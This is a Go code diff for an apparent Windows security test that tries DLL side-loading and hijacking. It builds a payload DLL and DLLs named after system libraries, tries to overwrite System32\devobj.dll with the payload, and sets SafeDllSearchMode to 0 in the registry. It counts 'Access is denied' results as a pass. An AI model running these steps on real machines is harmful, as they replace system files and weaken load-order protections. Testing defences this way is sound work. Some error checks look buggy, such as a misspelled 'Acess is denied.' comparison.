@@ -2,18 +2,20 @@ package main
 
 import (
 	"helpers"
+	"io"
 	"os"
 	"os/exec"
+	"strings"
 
 	"golang.org/x/sys/windows/registry"
 )
 
 func compileDLLs(nameOfLogFile string) {
-	cmd := exec.Command("go", "build", "-o", "../DLLSideLoading/kernel32.dll", "-buildmode=c-shared", "dll.go")
-	cmd1 := exec.Command("go", "build", "-o", "../DLLSideLoading/user32.dll", "-buildmode=c-shared", "dll.go")
-	cmd2 := exec.Command("go", "build", "-o", "../DLLSideLoading/advapi32.dll", "-buildmode=c-shared", "dll.go")
-	cmd3 := exec.Command("go", "build", "-o", "../DLLSideLoading/ole32.dll", "-buildmode=c-shared", "dll.go")
-	cmd4 := exec.Command("go", "build", "-o", "../DLLSideLoading/shell32.dll", "-buildmode=c-shared", "dll.go")
+	cmd := exec.Command("go", "build", "-o", "../DLLSideLoading/mshtml.dll", "-buildmode=c-shared", "dll.go")
+	cmd1 := exec.Command("go", "build", "-o", "../DLLSideLoading/comctl32.dll", "-buildmode=c-shared", "dll.go")
+	cmd2 := exec.Command("go", "build", "-o", "../DLLSideLoading/crypt32.dll", "-buildmode=c-shared", "dll.go")
+	cmd3 := exec.Command("go", "build", "-o", "../DLLSideLoading/wininet.dll", "-buildmode=c-shared", "dll.go")
+	cmd4 := exec.Command("go", "build", "-o", "../DLLSideLoading/shlwapi.dll", "-buildmode=c-shared", "dll.go")
 
 	cmd.Dir = "../DLLs"
 	cmd1.Dir = "../DLLs"
@@ -45,40 +47,92 @@ func compileDLLs(nameOfLogFile string) {
 
 func main() {
 	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "DLLSideLoad")
-	numberOfErrors := 0
-	numberOfNonCompiledDLLs := 0
-	_, err := registry.OpenKey(registry.LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager", registry.WRITE)
+	numOfCorrectTests := 0
+
+	cmd := exec.Command("go", "build", "-o", "./paylo.dll", "-buildmode=c-shared", "../DLLs/dll.go")
+	err := cmd.Run()
 	if err != nil {
-		numberOfErrors += 1
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+	}
+
+	paths := os.Getenv("SystemRoot")
+	listOfPaths := strings.Split(paths, string(os.PathListSeparator))
+
+	originalDllRead, err := os.OpenFile(listOfPaths[0]+"\\System32\\devobj.dll", os.O_RDONLY, 0666)
+	if err != nil {
+		if err.Error() != "Acess is denied." {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(2)
+		} else {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			numOfCorrectTests++
+		}
+	} else {
+		dll, err := os.Create("./devobj.dll")
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(3)
+		}
+
+		contOrgDll, err := io.ReadAll(originalDllRead)
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(4)
+		}
+
+		_, err = dll.Write(contOrgDll)
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(5)
+		}
+
+		paylo, err := os.OpenFile("./paylo.dll", os.O_RDONLY, 0666)
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(6)
+		}
+
+		contPay, err := io.ReadAll(paylo)
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(7)
+		}
+
+		originalDllWrite, err := os.OpenFile(listOfPaths[0]+"\\System32\\devobj.dll", os.O_WRONLY|os.O_TRUNC, 0666)
+		if err != nil {
+			if errorOutput := err.Error(); errorOutput[len(errorOutput)-17:] == "Access is denied." {
+				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+				numOfCorrectTests++
+			} else {
+				os.Exit(8)
+			}
+
+		} else {
+			_, err = originalDllWrite.Write(contPay)
+			if err != nil {
+				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+				os.Exit(9)
+			}
+		}
 	}
 
 	compileDLLs(nameOfLogFile)
-	_, err = os.OpenFile("./kernel32.dll", os.O_RDONLY, 0666)
+
+	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager", registry.WRITE)
 	if err != nil {
-		numberOfNonCompiledDLLs += 1
-	}
-	_, err = os.OpenFile("./advapi32.dll", os.O_RDONLY, 0666)
-	if err != nil {
-		numberOfNonCompiledDLLs += 1
-	}
-	_, err = os.OpenFile("./user32.dll", os.O_RDONLY, 0666)
-	if err != nil {
-		numberOfNonCompiledDLLs += 1
-	}
-	_, err = os.OpenFile("./ole32.dll", os.O_RDONLY, 0666)
-	if err != nil {
-		numberOfNonCompiledDLLs += 1
-	}
-	_, err = os.OpenFile("./shell32.dll", os.O_RDONLY, 0666)
-	if err != nil {
-		numberOfNonCompiledDLLs += 1
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		numOfCorrectTests += 1
 	}
 
-	if numberOfNonCompiledDLLs == 5 {
-		numberOfErrors += 1
+	err = key.SetDWordValue("SafeDllSearchMode", 0)
+	if err != nil {
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		if numOfCorrectTests == 1 {
+			numOfCorrectTests += 1
+		}
 	}
 
-	if numberOfErrors == 2 {
+	if numOfCorrectTests == 2 {
 		os.Exit(1)
 	}
 
